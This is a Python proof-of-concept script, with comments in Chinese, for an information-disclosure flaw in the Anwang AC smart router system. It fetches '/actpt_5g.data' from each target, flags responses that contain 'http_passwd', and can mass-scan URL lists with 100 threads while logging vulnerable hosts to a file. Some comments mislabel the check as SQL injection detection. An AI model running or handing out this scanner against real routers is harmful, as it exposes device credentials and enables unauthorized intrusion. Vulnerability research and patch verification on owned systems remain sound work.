# 安网AC智能路由系统actpt_5g.data信息泄露漏洞
import argparse, requests, sys  # 导入所需的库
from multiprocessing.dummy import Pool  # 导入线程池以支持并发处理
# 禁用HTTPS请求的警告信息
requests.packages.urllib3.disable_warnings()


def banner():
    # 打印横幅信息，包含作者、日期和版本
    test = """   
                                   author:MOYV  
                                   date:2024/09/03  
                                   version:1.0  
"""
    print(test)  # 打印横幅


def poc(target):
    # 漏洞检测函数，接受目标URL
    payload = '/actpt_5g.data'  # 漏洞利用的路径
    headers = {
        # 设置请求头，模拟浏览器请求
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
    }

    try:
        # 发送请求到目标URL，检查其可达性
        res1 = requests.get(url=target, verify=False, timeout=5)
        if res1.status_code == 200:  # 如果请求成功
            # 发送请求到目标URL加上payload，检查是否存在信息泄露
            res2 = requests.get(url=target + payload, headers=headers, timeout=5, verify=False)
            content = res2.text
            if 'http_passwd' in content:
                print(f"[+]{target}存在信息泄露")  # 输出检测到信息泄露的结果
                # 将结果写入文件
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在信息泄露\n")
            else:
                print(f"[-]{target}不存在信息泄露")  # 输出未检测到信息泄露的结果
    except:
        print(f"[!]{target}可能存在问题，请手动测试")  # 捕获异常并提示可能的问题


def main():
    # 主程序
    banner()  # 打印程序横幅信息
    # 设置命令行参数解析
    parse = argparse.ArgumentParser(description="安网AC智能路由系统actpt_5g.data信息泄露漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")  # URL参数
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")  # URL文件参数
    args = parse.parse_args()  # 解析参数

    # 根据用户输入的参数选择执行方式
    if args.url and not args.file:  # 当输入URL时
        poc(args.url)  # 进行单个URL的SQL注入检测
    elif not args.url and args.file:  # 当输入文件时
        with open(args.file, "r", encoding='utf-8') as f:
            url_list = [url.strip() for url in f.readlines()]  # 去掉换行符并添加到列表
        mp = Pool(100)  # 创建一个包含100个线程的线程池
        mp.map(poc, url_list)  # 并发执行SQL注入检测
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程完成
    else:
        # 提示用户正确的用法
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()  # 执行主函数
